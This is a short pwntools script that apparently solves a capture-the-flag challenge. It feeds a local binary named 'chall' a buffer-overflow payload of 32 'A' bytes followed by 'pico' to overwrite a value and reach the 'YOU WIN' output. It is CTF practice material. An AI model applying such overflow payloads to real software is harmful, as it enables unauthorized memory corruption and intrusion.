#!/usr/bin/env python
import pwn


def connect():
    return pwn.process("./chall")
    # return pwn.connect('127.0.0.1', 1337)


io = connect()
io.sendline(b"2")
payload = b""
payload += b"A" * 32
payload += b"pico"
io.sendline(payload)
io.sendline(b"4")
io.recvuntil(b"YOU WIN\n")
print(io.recvline())
